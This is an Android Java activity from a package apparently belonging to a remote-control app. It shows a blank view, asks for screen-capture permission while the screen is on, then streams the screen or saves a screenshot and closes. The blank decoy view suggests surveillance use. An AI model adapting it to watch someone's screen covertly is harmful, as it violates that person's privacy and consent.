package com.remote.app.Managers;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.support.annotation.Nullable;
import android.view.View;
import android.widget.TextView;


public class ScreenActivity extends Activity {

    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView tv = new TextView((Context)this);
        tv.setText((CharSequence)"");
        this.setContentView((View)tv);

        Object var10000 = this.getSystemService(POWER_SERVICE);
        PowerManager powerManager = (PowerManager)var10000;
        if (powerManager.isInteractive()) {
            this.screenCast();
        }
    }

    private final void screenCast() {
        Object var10000 = this.getSystemService(MEDIA_PROJECTION_SERVICE);
        MediaProjectionManager mgr = (MediaProjectionManager)var10000;
        this.startActivityForResult(mgr.createScreenCaptureIntent(), 7575);

    }

    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 7575 && resultCode == -1) {
            if(getIntent().getBooleanExtra("streamScreen", false)) new StreamScreen(getApplicationContext(),new Handler(), resultCode, data).run();
            else new TakeScreenShot(getApplicationContext(), new Handler(), resultCode, data).run();
        }
        finish();

    }
}
